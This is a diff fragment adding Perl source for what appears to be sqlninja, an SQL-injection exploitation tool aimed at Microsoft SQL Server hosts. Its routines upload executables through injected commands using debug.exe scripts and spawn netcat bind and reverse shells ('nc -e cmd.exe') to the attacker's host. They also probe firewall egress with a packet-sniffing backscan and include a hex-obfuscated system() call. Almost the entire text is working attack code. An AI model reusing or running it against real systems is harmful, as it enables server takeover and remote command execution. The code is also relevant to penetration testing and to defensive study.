+		my $cmd = "del \%TEMP\%\\".$filearray[0].".*";
+		my $command = createcommand($cmd);
+		my $result = sendrequest($command);
+		# If the file is already in scr format, we assume that the size of the 
+		# exe is <64k and just upload it in one go
+		if ($filearray[1] eq "scr") {
+			print "[+] File is already in script format. I won't be able to check\n".
+		      		"    the correct size of the resulting binary\n";
+			uploadrnd($file, 0, -1); # -1 means "don't check size!"
+			return;
+		}
+	} elsif ($filearray[1] eq "scr") {
+		print "[-]  ".$file." has already a scr extension. Are you sure you\n".
+		      "     want to continue? (y/n)";
+		my $sure;
+		unless (($sure eq "y") or ($sure eq "n")) {
+			print "\n> ";
+			$sure = <STDIN>;
+			chomp($sure);
+			if ($sure eq "n") {
+				print "\n[-] Exiting....\n";
+				exit(0);
+			}
+		}
+	}
+	# If we are here, we were given a binary file
+	# Measure file size and calculate how many rounds are needed
+	my $rounds = int($filesize / 0xFEFF)+1; # 0x0100 reserved for debug.exe
+	if ($rounds == 1) {
+		# One round is enough. Create the script, upload it, convert it and exit
+		makescr($file,"/tmp/".$filearray[0].".scr");
+		if ($genscript == 0) {
+			uploadrnd("/tmp/".$filearray[0].".scr", 0, $filesize);
+			system("rm /tmp/".$filearray[0].".scr");
+		} else {
+			print "[+] Debug script created: /tmp/"
+				.$filearray[0].".scr\n";
+		}
+		return;
+	}
+	print "[+] We need to split the file into ".$rounds." chunks\n";
+	# Split the original files in $rounds chunks
+	# Upload the various chunks and convert them
+	open(FILE, "<".$file);
+	binmode FILE;
+	my $record;
+	for (my $i=1; $i<=$rounds; $i++) {
+		read(FILE, $record, 0xFEFF);
+		open (OUT, ">/tmp/".$filearray[0].".exe_".$i);
+		print OUT $record;
+		close OUT;
+	}
+	for (my $i=1; $i<=$rounds; $i++) {
+		my $chunksize = -s "/tmp/".$filearray[0].".exe_".$i;
+		makescr("/tmp/".$filearray[0].".exe_".$i,"/tmp/"
+						.$filearray[0].".scr_".$i);
+		if ($genscript == 0) {
+			uploadrnd("/tmp/".$filearray[0].".scr_".
+							$i,$i,$chunksize);
+			system("rm /tmp/".$filearray[0].".*_".$i);
+		} else {
+			system("rm /tmp/".$filearray[0].".exe_".$i);
+		}
+	}
+	if ($genscript == 1) {
+		print "[+] Debug scripts created: /tmp/".$filearray[0].
+						".scr_X\n";
+		exit(0);
+	}
+	# Glue together the various chunks
+	print "[+] Joining the various binary chunks together...\n";
+	my $cmd = "copy /b ";
+	for (my $i=1; $i<$rounds; $i++) {
+		$cmd .= "\%TEMP\%\\".$filearray[0].".exe_".$i." +";
+	}
+	$cmd .= "\%TEMP\%\\".$filearray[0].".exe_".$rounds." \%TEMP\%\\"
+						.$filearray[0].".exe.";
+	my $command = createcommand($cmd);
+	my $result = sendrequest($command);
+
+	# Check that the final size matches
+	print "[+] Checking that the resulting ".$filearray[0].".exe "
+						."has the correct size...\n";
+	if ($verbose == 1) {
+		print "[v] Expecting it to have ".$filesize." bytes\n";
+	}
+	my $size_ok = checkremotesize($filearray[0].".exe",$filesize);
+	if ($size_ok == 1) {
+		print "[+] Filesize corresponds... enjoy! :)\n";
+	} else {
+		print "[-] Filesize does not correspond. Something went ".
+								"wrong\n";
+	}
+	# Remove chunks
+	$cmd = "del %TEMP%\\".$filearray[0].".exe_*";
+	$command = createcommand($cmd);
+	$result = sendrequest($command);
+}
+
+# Upload and conversion of a single round
+sub uploadrnd{
+	my $cmd;
+	my $command;
+	my $result;
+	my $file = $_[0];
+	my $round = $_[1];
+	my $filesize = $_[2];
+	my @path = split(/\//,$file);
+	my $filename = pop(@path);
+	my @filearray = split(/\./,$filename);
+	print "[+] Uploading ".$file." debug script............\n";
+	open (FILE, $file) || die "can't open file ".$file.": $!";
+	my $line;
+	my $countlines = 0;
+	# Count total lines in the file
+	my $totallines;
+	while ($line = <FILE>) {
+		$totallines++;
+	}
+	close FILE;
+
+	# Upload the whole script thing
+	open (FILE, $file);
+	$line = <FILE>;
+	$cmd = "echo n %TEMP%\\#temp# > \%TEMP\%\\".$filename;
+	$command = createcommand($cmd);
+	$result = sendrequest($command);
+	$countlines++;
+	$cmd = "";
+	# First n chunks of script
+	for (my $i = 1; $i < int($totallines/$lines_per_req); $i++) {
+		for (my $y=0; $y<($lines_per_req-1); $y++) {
+			$line = <FILE>;
+			# goddamned \r's .... >:|
+			$line =~ s/\r//g;
+			chomp($line);
+			$cmd .= "echo ".$line." >> \%TEMP\%\\".$filename." && ";
+			$countlines++;
+		}
+		$line = <FILE>;
+		$line =~ s/\r//g;
+		chomp($line);
+		$cmd .= "echo ".$line." >> \%TEMP\%\\".$filename;
+		$countlines++;
+		$command = createcommand($cmd);
+		$result = sendrequest($command);
+		$cmd = "";
+		print $countlines."/".$totallines." lines written       \r";
+	}
+	# Last chunk
+	while ($line = <FILE>) {
+		$line =~ s/\r//g;
+		chomp($line);
+		$cmd = "echo ".$line." >> \%TEMP\%\\".$filename;
+		$countlines++;
+		$command = createcommand($cmd);
+		$result = sendrequest($command);
+		print $countlines."/".$totallines." lines written       \r"; 
+	}
+	print $totallines."/".$totallines." lines written         \ndone!\n";
+	close FILE;
+	
+	# Check that the exact number of lines was uploaded
+	# We count the lines and store the result in a temporary file, then 
+	# we check the last token in that file	
+	my $delay;
+	my $wrongscr = 0;
+	local $/=\1;
+	local $|=1;
+	if ($verbose == 1) {
+		print "[v] Checking number of uploaded lines\n";
+	}
+	$cmd = "find /v /c \"zzzz\" \%TEMP\%\\".$filename." > \%TEMP\%\\lines.txt ".
+	       "& find \" ".$totallines."\" \%TEMP\%\\lines.txt > nul ".
+	       "& if not errorlevel = 1 ping -n ".$blindtime." 127.0.0.1 ".
+	       "& del \%TEMP\%\\lines.txt";
+	$command = createcommand($cmd);
+	$delay = tryblind($command);
+	if ($delay > ($blindtime-2)) {
+		if ($verbose == 1) {
+			print "[v] ".$filename." seems to have been ".
+				"properly uploaded\n";
+		}
+	} else {
+		$wrongscr = 1;
+		print "[-] ".$filename." seems not to have been uploaded".
+				" correctly.\n";
+		print "[-] Checking whether it is there.... ";
+		my $present = checkfile("\%TEMP\%\\$filename");
+		if ($present == 0) {
+			print "no. User has not write privileges?\n";
+			exit(1);
+		}
+		print "yes.\n    You want to count the uploaded lines? (y/n)";
+		my $resp="";
+		while (($resp ne "y") and ($resp ne "n")) {
+			print "\n> ";
+			$resp = <STDIN>;
+			chomp($resp);
+		}
+		if ($resp eq "y") {
+			checkscrlines($filename,$totallines);
+		}
+		
+		print "[-] You want me to try to create an exe anyway?";
+		$resp="";
+		while (($resp ne "y") and ($resp ne "n")) {
+			print "\n> ";
+			$resp = <STDIN>;
+			chomp($resp);
+		}
+		if ($resp eq "n") {
+			print "[-] Bye...\n";
+			delscr($filename);
+			exit(1);
+		}
+	}
+	
+	# Generate the binary file
+	print "[+] Converting script to executable... might take a while\n";
+	$cmd = "debug < \%TEMP\%\\".$filename;
+	$command = createcommand($cmd);
+	$result = sendrequest($command);
+
+	# Rename the binary 
+	my $exefile = $filearray[0].".exe";
+	if ($round > 0) {
+		$exefile .= "_".$round;
+	}
+	$cmd = "ren \%TEMP\%\\#TEMP# ".$exefile;
+	$command=createcommand($cmd);
+	$result = sendrequest($command);
+	
+	delscr($filename);
+	my $size_ok;	
+	# We check whether the exe file has the correct size
+	unless ($filesize == -1) {
+		print "[+] Checking that ".$exefile." has the expected filesize...\n";
+		if ($verbose == 1) {
+			print "[v] Expecting it to have ".$filesize." bytes\n";
+		}
+		$size_ok = checkremotesize($exefile,$filesize);
+		if ($size_ok == 1) {
+			print "[+] Filesize corresponds... :)\n";
+			return;
+		} else {
+			print "[-] Filesize does not correspond. Something might be wrong\n";
+		}
+	}
+	# We check whether the exe file is there.... 
+	print "[+] Checking whether ".$exefile." is there...\n";
+	$cmd = "if exist \%TEMP\%\\".$exefile." (ping -n ". $blindtime." 127.0.0.1)";
+	$command = createcommand($cmd);
+	$delay = tryblind($command);
+	if ($delay > ($blindtime - 2)) {
+		# If we are here, a exe is present....
+		# Now let's check that its size is not zero (it can happen
+		# if debug.exe fails)
+		if ($verbose == 1) {
+			print "[v] Checking whether ".$exefile." is empty\n";
+		}
+		# Checking whether the exe file is empty
+		$size_ok = checkremotesize($exefile,0);
+		if ($size_ok == 1) {
+			# Check is successful, therefore it's an empty exe
+			print "[-] ".$exefile." seems to be there but empty. ". 
+       		      		"Debug.exe has probably failed\n";
+		} else {
+			# Non-empty exe
+			if ($filesize == -1) {
+				print "[+] ".$exefile." seems to be there :)\n";
+			} else {
+				print "[-] A ".$exefile." seems to be there... can't be sure will work\n";
+			}
+		}
+			
+	} else {
+		# If we get here, the exe is not there
+		if ($wrongscr == 1) {
+			print "[-] ".$exefile." was not found ".
+			            "(debug script corrupted)\n";
+		} else {
+			print "[-] ".$exefile." was not found ".
+		             "(debug.exe not present?)\n";
+		}
+	}
+}
+
+
+# Delete the uploaded script file
+sub delscr
+{
+	my $filename = $_[0];
+	if ($verbose == 1) {
+		print "[v] Removing the original scr file\n";
+	}
+	my $cmd = "del \%TEMP\%\\".$filename;
+	my $command=createcommand($cmd);
+	my $result = sendrequest($command);
+}
+
+# Count the script uploaded lines
+sub checkscrlines
+{
+	my $filename = $_[0];
+	my $lines = $_[1];
+
+	print "[-] Counting uploaded lines... might take a bit\n";
+	
+	# We start by getting the lines (again...)
+	my $cmd = "find /c /v \"zzzzz\" %TEMP%\\".$filename." > ".
+	          "%TEMP%\\lines.txt";
+	my $command=createcommand($cmd);
+	my $result = sendrequest($command);
+
+	# Now we find the interval where that number is
+	my $min = 0;
+	my $max = 0;
+	my $candidate = $lines;
+	my $delay;
+	while ($max == 0) {
+		$delay=singlelinescheck($candidate);
+		if ($delay > ($blindtime - 2)) {
+			$max = $candidate;
+		} else {
+			$min = $candidate;
+			$candidate = $candidate*2;
+		}
+	}
+
+	# Now we know that the number is between $min and $max
+	if ($verbose == 1) {
+		local $/=\1;
+		local $|=1;
+		print "Trying... ";
+	}
+	while ($max != $min) {
+		$candidate = int(($max+$min)/2);
+		if ($verbose == 1) {
+			local $/=\1;
+			local $|=1;
+			print $candidate."... ";
+		}
+		$delay = singlelinescheck($candidate);
+		if ($delay > ($blindtime-2)) {
+			$max = $candidate;
+		} else {
+			$min = $candidate+1;
+		}
+	}
+	if ($verbose == 1) {
+		print "\n";
+	}
+	print "[-] ".$max." lines were uploaded instead of ".$lines."\n";
+	$cmd = "del %TEMP%\\lines.txt";
+	my $command=createcommand($cmd);
+	my $result = sendrequest($command);
+}
+
+# Perform a single check on the number of lines
+sub singlelinescheck
+{
+	my $cmd = "for /F \"tokens=3\" %i in (%TEMP%\\lines.txt) do ".
+		     "(if %i LEQ ".$_[0]." ping -n ".$blindtime." 127.0.0.1)";
+	my $command = createcommand($cmd);
+	my $delay = tryblind($command);
+	return $delay;
+}
+
+# Checks whether a file is present on the remote server
+sub checkfile
+{
+	my $file = $_[0];
+	my $cmd = "if exist $file (ping -n $blindtime 127.0.0.1)";
+	my $command = createcommand($cmd);
+	my $delay = tryblind($command);
+	if ($delay > ($blindtime - 2)) {
+		return 1;
+	} else {
+		return 0;
+	}
+}
+
+sub checkremotesize
+{
+	my $file = $_[0]; # file to check
+	my $size = $_[1]; # expected size
+	if ($_[1] > 0) {
+		$size = add_separators($size);
+	}
+	# File size can be token 3 or 4 depending on cmd.exe version
+	my $cmd = "dir \%TEMP\%\\".$file." | ".
+             "find \"".$file."\" > \%TEMP\%\\xtst.txt & ".
+             "for /F \"tokens=3\" \%i in (\%TEMP\%\\xtst.txt) do ".
+             "(if \"\%i\" equ \"".$size."\" ping -n ".$blindtime." 127.0.0.1)  & ".
+	     "for /F \"tokens=4\" \%i in (\%TEMP\%\\xtst.txt) do ".
+	     "(if \"\%i\" equ \"".$size."\" ping -n ".$blindtime." 127.0.0.1)  & ".
+             "del \%TEMP\%\\xtst.txt.";
+	my $command = createcommand($cmd);
+	my $delay = tryblind($command);
+	if ($delay > ($blindtime-2)) {
+		return 1;
+	} else {
+		return 0;
+	}
+}
+
+# Formats a string by adding a comma to separate each set of 3 digits
+# Needed to check filesizes under Windows
+sub add_separators
+{
+	my $number = $_[0]; # The number to format
+	my $formatted_number; 
+	my $number_lo; # 3 least significant digits
+	my $number_hi; # Most significant digits
+	my $n_tokens = int(log10($number)/3); # Number of needed commas
+	for (my $i=0; $i<=$n_tokens; $i++) {
+		$number_hi = int($number/1000);
+		$number_lo = $number - $number_hi*1000;
+		$formatted_number = $number_lo.",".$formatted_number;
+		$number = $number_hi;
+	}
+	chop($formatted_number); # Remove the last comma
+	return $formatted_number;
+}
+
+sub log10
+{
+	return log($_[0])/log(10);
+}
+
+# Convert a binary file to its debug script representation
+# File must not be larger than 0xFEFF (0xFFFF-0x100) bytes
+sub makescr
+{
+	my $file = $_[0]; # Binary input file
+	my $output = $_[1]; # Script output file
+
+	# Here we create the new file, and we set its size in the cx register
+	my $script = "n %TEMP%\\#temp#\nr cx\n";
+	my $filesize = -s $file;
+	if ($filesize > 65535) {
+		die "[-] file is too big for debug.exe\n";
+	}
+	$filesize = sprintf("%x",$filesize);
+	$script .= $filesize."\n";
+
+	# We zero all the memory segment
+	$script .= "f 0100 ffff 00\n";
+
+	my $record;
+	my @a;
+	my $template = "C";
+	my $counter = 256; # Position where to write the bytes. 256 = 0x100 :)
+	my $counter2 = 0; # Number of consecutive bytes in the current script line
+	my $b;
+	my $string = "";
+	open (FILE, "<".$file);
+	# Jussi's algorithm here: we set bytes that are different from zero
+	# Each script line sets up to 20 non-zero consecutive bytes
+	while (read(FILE,$record,1)) {
+		@a = unpack($template,$record);
+		foreach (@a)  {
+			$b = sprintf("%02x",$_); # byte value in hex
+			if ($_ ne "0") {
+			$counter2++;
+				if ($string eq "") { # Beginning of a new script line
+					$string = "e ".sprintf("%x",$counter)." ".$b;
+				} else { # We append to the current script line
+					$string .= " ".$b;
+				}
+			} else {
+				if ($string ne "") {
+					$script .= $string."\n"; # end of current line
+					$string = "";
+					$counter2 = 0;
+				}
+			}
+		}
+		$counter++;
+		if ($counter2 == 20) { # reached 20 bytes in the current script line
+			$script .= $string."\n";
+			$string = "";
+			$counter2 = 0;
+		}
+	}
+	# All bytes read.... flush what's left in $string
+	if ($string ne "") {
+		$script .= $string."\n";
+	}
+	$script .= "w\nq\n"; # Yay! Write the file and exit
+	open (OUT, ">".$output) or die "Can't write to ".$output."\n";
+	print OUT $script;
+	if ($verbose == 1) {
+	        print "[v] Debug script created successfully\n";
+	}
+	close FILE;
+	close OUT;
+}
+
+# Direct tcp and udp shell
+sub dirshell {
+	if ($verbose == 1) {
+		print "  [v] Starting dirshell module\n";
+	}
+	my $rport;
+	my $rhost;
+	my $proto;
+
+	print "Host to connect to [".$host."]: ";
+	$rhost = <STDIN>;
+	chomp ($rhost);
+	if ($rhost eq "") {
+		$rhost = $host;
+	}
+	$rport = 0;
+	print "Remote port: ";
+	$rport = <STDIN>;
+	chomp($rport);  
+	# of course it must be a number
+	while ($rport > 65535 or $rport < 1 or $rport !~ m/^\d+$/) {
+		print "Port must be between 1 and 65535 (RFC 793, dude)\n";
+		print "Remote port: ";
+		$rport = <STDIN>;
+		chomp($rport);
+	}
+	while (($proto ne "tcp") and ($proto ne "udp")) {
+		print "tcp/udp [default: tcp]: ";
+		$proto = <STDIN>;
+		chomp($proto);
+		if ($proto eq "") {
+			$proto = "tcp";
+		}
+	}
+	my $command;
+	my $cmd;
+	if ($proto eq "udp") {
+		$cmd = "\%TEMP\%\\nc -u -l -e cmd.exe -p ".$rport;
+	} else {
+		$cmd = "\%TEMP\%\\nc -l -e cmd.exe -p ".$rport;
+	}
+	if ($churrasco == 1) {
+		$cmd = usechurrasco($cmd);
+	}
+	$command = createcommand($cmd);
+	# Launch the process for the web request
+	print "[+] Sending the request to the web server....\n";
+	my $requestpid = fork();
+	if ($requestpid == -1) {
+		print "Can't fork: $!\n";
+		exit(1);
+	}
+	# child: send the request and exit
+	if ($requestpid == 0) {
+		my $result = sendrequest($command);
+		exit(0);
+	}
+	# father: wait and contact the shell daemom
+	my $t = 3;
+	print "[+] Waiting ".$t." seconds for the remote command ".
+				"to execute... \n";
+	sleep($t);
+	print "[+] Trying to contact the remote host... \n";
+	if ($proto eq "udp") {
+		udpdirshell($rhost, $rport);
+	} else {
+		tcpdirshell($rhost, $rport);
+	}
+	kill ("TERM", $requestpid);
+	exit(0);
+}
+
+# tcp shell client
+sub tcpdirshell
+{
+	if ($verbose == 1) {
+		print "  [v] Creating client socket...\n";
+	}
+	my $handle = IO::Socket::INET->new
+	(
+		PeerAddr => $_[0],
+		PeerPort => $_[1],
+		Proto    => 'tcp',
+		Type     => SOCK_STREAM
+	);
+	if (! defined($handle)) {
+		print "Could not create socket\n";
+		return (1);
+	}
+	local $/=\1;
+	local $|=1;
+	
+	my $kidpid;
+	my $line;
+	die "can't fork: $!" unless defined($kidpid = fork());
+	if ($kidpid == 0) {
+		while (defined($line=<$handle>)) {
+			print STDOUT $line;
+		}
+		kill("TERM", $kidpid);
+	} else {
+		while (defined($line = <STDIN>)) {
+			print $handle $line;
+		}
+	}
+	close $handle;
+}
+
+# udp shell client
+sub udpdirshell
+{
+	if ($verbose == 1) {
+		print "  [v] Creating client socket...\n";
+	}
+	my $handle = IO::Socket::INET->new
+	(
+		PeerAddr => $_[0],
+		PeerPort => $_[1],
+		Proto    => 'udp'
+	);
+	if (!defined($handle)) {
+		print "Could not create socket\n";
+		return (1);
+	}
+	local $/=\1;
+	local $|=1;
+	my $kidpid;
+	my $char;
+	my $command;
+	print $handle "\n";
+	die "can't fork: $!" unless defined($kidpid = fork());
+	if ($kidpid == 0) {
+		while (defined ($char = <$handle>)) {
+			print $char;
+		}
+	} else {
+		sleep 2;
+		while (defined($char = <STDIN>)) {
+			$handle->send($char);
+			if ($char ne "\n") {
+				$command = $command.$char;
+			} else {
+				if ($command eq "exit") {
+					print "exiting... \n";
+					kill ("TERM",$kidpid);
+					close $handle;
+					return (0);
+				} else {
+					$command = "";
+				}
+			}
+		}
+	}
+}
+
+
+# Reverse tcp and udp shell
+sub revshell
+{	
+	if ($verbose == 1) {
+		print "  [v] Starting revshell module\n";
+	}
+	my $lport;
+	my $proto;
+	
+	$lport = 0;
+	print "Local port: ";
+	$lport = <STDIN>;
+	chomp($lport);	
+	# of course it must be a number
+	while ($lport > 65535 or $lport < 1 or $lport !~ m/^\d+$/) {
+		print "Port must be between 1 and 65535 (RFC 793, dude)\n";
+		print "Local port: ";
+		$lport = <STDIN>;
+		chomp($lport);
+	}
+	while (($proto ne "tcp") and ($proto ne "udp") and ($proto ne "rock")) {
+		print "tcp/udp [default: tcp]: ";
+		$proto = <STDIN>;
+		chomp($proto);
+		if ($proto eq "") {
+			$proto = "tcp";
+		}
+	}
+	if ($proto eq "rock") {
+		r();
+		exit(0);
+	}
+	my $command;
+	my $cmd;
+	if ($verbose == 1) {
+		print "  [v] Starting listener process\n";
+	}
+	if ($proto eq "udp") {
+		my $listenerpid = fork();
+		if ($listenerpid == 0) {
+			udplistener($lport);
+			exit(0);
+		}
+		$cmd = "\%TEMP\%\\nc -u -e cmd.exe ".$lhost." ".$lport;
+	} else {
+		my $listenerpid = fork();
+		if ($listenerpid) {
+			tcplistener($lport);
+			exit(0);
+		}
+		$cmd = "\%TEMP\%\\nc -e cmd.exe ".$lhost." ".$lport;
+	}
+	if ($churrasco == 1) {
+		$cmd = usechurrasco($cmd);
+	}
+	$command = createcommand($cmd);
+	my $result = sendrequest($command);
+}	
+
+# Undocumented but doesn't do anything nasty :)
+sub r
+{
+	print("\x0a\x0a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a".
+	      "\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a".
+	      "\x2a\x2a\x2a\x2a\x0a\x57\x65\x6c\x63\x6f\x6d\x65\x20\x74\x6f\x20\x73".
+	      "\x71\x6c\x6e\x69\x6e\x6a\x61\x20\x72\x61\x64\x69\x6f\x20\x70\x6c\x61".
+	      "\x79\x65\x72\x21\x21\x0a\x49\x20\x68\x6f\x70\x65\x20\x79\x6f\x75\x20".
+	      "\x68\x61\x76\x65\x20\x6d\x70\x6c\x61\x79\x65\x72\x20\x69\x6e\x73\x74".
+	      "\x61\x6c\x6c\x65\x64\x20\x3a\x29\x0a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a".
+	      "\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a".
+	      "\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x0a\x0a");
+	system("\x6d\x70\x6c\x61\x79\x65\x72\x20\x68\x74\x74\x70\x3a\x2f\x2f\x76\x65".
+	       "\x6e\x75\x73\x2e\x73\x68\x61\x72\x70\x2d\x73\x74\x72\x65\x61\x6d\x2e".
+	       "\x63\x6f\x6d\x2f\x70\x6c\x61\x6e\x65\x74\x72\x6f\x63\x6b");
+}
+
+# Local server for tcp reverse shell
+sub tcplistener 
+{
+	my $lport = $_[0];
+	if ($verbose == 1) {
+		print "  [v] Creating local listening tcp socket\n";
+	}
+	my $server=IO::Socket::INET->new (Proto     => 'tcp',
+					  LocalPort => $lport,	
+					  Listen    => 1,
+					  Reuse	    => 1)
+		|| die "can't create local socket on port ".$lport.": $!";
+	print "[+] waiting for shell on port ".$lport."/tcp...\n";
+
+	my $client = $server->accept()
+			|| die "can't establish connection with peer: $!";
+	my $kidpid;
+	die "can't fork: $!" unless defined($kidpid = fork());
+	my $char;
+	
+	# this is needed to visualize the dos prompt even
+	# if a newline is not present at its end
+	local $/=\1;
+	local $|=1; 
+
+	# we receive the output here
+	if ($kidpid != 0) {
+		while (defined($char=<$client>)) {
+			print $char;
+		}
+		kill ("TERM",$kidpid);
+	} else {
+		# and here we issue the commands
+		while (defined ($char = <STDIN>)) {
+			print $client $char;
+		}
+	}
+	if ($verbose == 1) {
+		print "  [v] Closing listening socket\n";
+	}
+	close $server;
+	close $client;
+}
+
+# Local server for udp reverse shell
+sub udplistener 
+{
+	my $lport = $_[0];
+	if ($verbose == 1) {
+		print "  [v] Creating local listening udp socket\n";
+	}
+	my $server=IO::Socket::INET->new (Proto	   => 'udp',
+					 LocalPort => $lport)
+		|| die "can't create local socket on port ".$lport.": $!";
+	print "[+] waiting for shell on port ".$lport."/udp...\n";
+	
+	my $kidpid;
+	my $char;
+	local $/=\1;
+	local $|=1;
+	my $i;
+	my $command;
+	$server->recv($char,256);
+	print $char;
+	my ($pp,$aa);
+	($pp,$aa) = sockaddr_in($server->peername);
+	$kidpid = fork();
+	if ($kidpid == -1) {
+		die "can't fork: $!";
+	}
+	# child process........
+	if ($kidpid == 0) {
+		while (defined ($char = <$server>)) {
+			print $char;
+		}
+	} 
+	# parent process........
+	else {
+		while (defined ($char = <STDIN>)) {
+			$char =~ s/\n/\r\n/g;
+			$server->send($char);
+			if ($char ne "\n") {
+				$command = $command.$char;
+			} else {
+				if ($command eq "exit") {
+					print "exiting.... \n";
+					kill ("TERM",$kidpid);
+					close $server;
+					exit(0);
+				} else {
+					$command = "";
+				}
+			}
+		}
+	}
+}
+
+
+# Performs a tcp/udp backscan trying to find a hole in the firewall
+# Creates 3 subprocesses: the first sniffs the interface, the second 
+# performs the request to the web server. The parent then waits for their
+# messages and when the second process exits it spawns the third, which
+# waits for the timeout specified in the conf file and then signals
+# the father, which finally kills the children and exits
+sub backscan 
+{
+	if ($verbose == 1) {
+		print "  [v] Starting backscan module\n";
+	}
+	my $snifferpid; # the sniffer
+	my $requestpid; # the web requestor
+	my $timeoutpid; # the timeout after the web request exits
+	
+	# Get the ports to scan
+	my $ports;
+	print "Ports to try (es. \"80 443-445\"): ";
+	$ports = <STDIN>;
+	chomp($ports);
+	while (checkports($ports) != 0) {
+		print "You must specify ports with a netcat-like syntax\n";
+		print "Check sqlninja-howto.html for more info\n";
+		$ports = <STDIN>;
+		chomp($ports);
+	}
+	# $ports =~ s/\s/+/g;
+	
+	# Get the protocol to use	
+	my $proto;
+	while (($proto ne "tcp") and ($proto ne "udp")) {
+		print "tcp/udp [default: tcp]: ";
+		$proto = <STDIN>;
+		chomp($proto);
+		if ($proto eq "") {
+			$proto = "tcp";
+		}
+	}
+	
+	print ("[+] Starting ".$proto." backscan on host ".$host.".....\n");
+
+	# start a socket to listen for messages from children
+	my $ninjasock = genfile();
+	unlink $ninjasock;
+	if ($verbose == 1) {
+		print "  [v] Starting local UNIX socket\n";
+	}
+	my $server = new IO::Socket::UNIX->new(Local => $ninjasock,
+					       Type  => SOCK_DGRAM, 
+					       Listen   => 5)
+				|| die "could not create UNIX socket\n";
+	my $msg; # message from children
+	my $ok; # flag for successfully received packet
+	my @okports;  # allowed ports from server
+	
+	if ($verbose == 1) {
+		print "  [v] Starting sniffer process\n";
+	}
+	# spawn sniffer
+	$snifferpid = fork();
+	if ($snifferpid == -1) {
+		print "can't fork sniffer process !\n";
+		unlink $ninjasock;
+		exit(1);
+	}
+	if ($snifferpid == 0) {
+		$server->close;
+		sniff($proto, $ninjasock);
+		exit (0);
+	}
+	if ($verbose == 1) {
+		print "  [v] Starting web request process\n";
+	}
+	# spawn the process for the web request
+	$requestpid = fork();
+	if ($requestpid == -1) {
+		print "can't fork web request process !\n";
+		kill TERM => $snifferpid;
+		unlink $ninjasock;
+		exit(1);
+	}
+	if ($requestpid == 0) {
+		$server->close;
+		backscanrequest($lhost,$ports,$proto,$ninjasock);
+		exit(0);
+	}
+
+	# receive port numbers from the sniffer until the
+	# web requestor communicates it is done
+	if ($verbose == 1) {
+		print "  [v] Recording successful ports\n";
+	}
+	recordports($server,$ok,\@okports,"finished");
+	
+	# spawn the timeout child, to wait for some more packets to
+	# arrive
+	if ($verbose == 1) {
+		print "  [v] Web request finished... waiting for last packets\n";
+	}
+	$timeoutpid = fork();
+	if ($timeoutpid == -1) {
+		print "can't fork timeout child !\n";
+		kill TERM => $snifferpid;
+		unlink $ninjasock;
+		exit(1);
+	}
+	if ($timeoutpid == 0) {
+		sleep($timeout);
+		my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
+		 			       Type     => SOCK_DGRAM,
+					       Timeout  => 10);
+		$s->send("timeout");
+		close $s;
+		exit(0);
+	}
+
+	# receive port numbers from the sniffer until timeout
+	recordports($server,$ok,\@okports,"timeout");
+									
+	print "[+] shutting down sniffer...\n";
+	kill TERM => $snifferpid;
+
+	unlink $ninjasock;
+
+	if ($ok == 1) {
+		print "Now launch the Ninja in revshell mode and have fun!\n";
+	} else {
+		print "Sorry... no packets received\n";
+	}
+}
+
+# Records the successful ports until interrupted by the other child
+# Parameters:
+# $_[0] = parent socket
+# $_[1] = $ok
+# $_[2] = \@okports
+# $_[3] = exit string awaited from child
+sub recordports
+{
+	my $msg;
+	while ($msg ne $_[3]) {
+		$_[0]->recv($msg,16,0);
+		if (($msg < 65535) and ($msg > 0)) {
+			$_[1] = 1;
+			if (${$_[2]}[$msg] == 0) {
+				printf "port ".$msg." ok !\n";
+				${$_[2]}[$msg] = 1;
+			}
+		}
+	}
+}
+
+sub backscanrequest 
+{
+	my $lhost = $_[0];
+	my $ports = $_[1];
+	my $proto = $_[2];
+	my $ninjasock = $_[3];
+	my $cmd;
+	my $command;
+	my $result;
+	if ($proto eq "udp") {
+		# we need to issue a command (e.g.: hostname.exe) for an
+		# UDP packet to be created...
+		$cmd = "\%TEMP\%\\nc -e hostname -u ".$lhost." ".$ports;
+	} else {
+		$cmd = "\%TEMP\%\\nc ".$lhost." ".$ports;
+	}
+	$command = createcommand($cmd);
+	$result = sendrequest($command);
+	 my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
+	                               Type     => SOCK_DGRAM,
+			               Timeout  => 10);
+	$s->send("finished");
+	close $s;
+}
+
+# Anti script kiddies ;)
+sub _ 
+{
+if ($0 !~ m/.*\/\x73\x71\x6c\x6e\x69\x6e\x6a\x61$/i) {
+	print"\x0a\x64\x75\x64\x65\x2c\x20\x74\x68\x65\x20\x66\x69\x6c\x65\x6e".
+	"\x61\x6d\x65\x20\x4d\x55\x53\x54\x20\x62\x65\x20\x22\x73\x71\x6c\x6e".
+	"\x69\x6e\x6a\x61\x22\x2e\x20\x55\x73\x65\x20\x74\x68\x65\x20\x70\x72".
+	"\x6f\x70\x65\x72\x20\x6e\x61\x6d\x65\x20\x61\x6e\x64\x20\x74\x72\x79".
+	"\x20\x61\x67\x61\x69\x6e\x0a\x0a";exit(0);
+      }
+}
+
+# sniff the interface for backscan results
+sub sniff 
+{
+	my $filter;
+	my $proto = $_[0];
+	my $ninjasock = $_[1];
+	# TODO: filter host must be changed: NAT could mess up things
+	my $size = 1500;
+	my $tout = 3;
+	my $err;
+	if ($verbose == 1) {
+		print "  [v] Looking for sniffing device info\n";
+	}
+	my ($address,$netmask);
+	if (Net::Pcap::lookupnet($dev,\$address,\$netmask,\$err)) {
+		die "Unable to look up device information for".$dev."\n";
+	}
+	if ($verbose == 1) {
+		print "  [v] Initializing pcap object\n";
+	}
+	my $pcap = Net::Pcap::open_live($dev,$size,0,0,\$err);
+	unless (defined $pcap) {
+		die "Unable to create packet capture on ".$dev."\n".
+				"...are you sure you have r00t privileges ?";
+	}	
+	# Create filter string from conf file and protocol
+	my $filterstring;
+	if ($proto eq "udp") {
+		$filterstring = $filterconf." and udp";
+	} else {
+		$filterstring = $filterconf." and tcp[tcpflags] & ".
+					    "tcp-syn != 0 && ".
+					    "tcp[tcpflags] & tcp-ack == 0";
+	}
+	if ($verbose == 1) {
+		print "  [v] Compiling packet capture filter: ".$filterstring."\n";
+	}
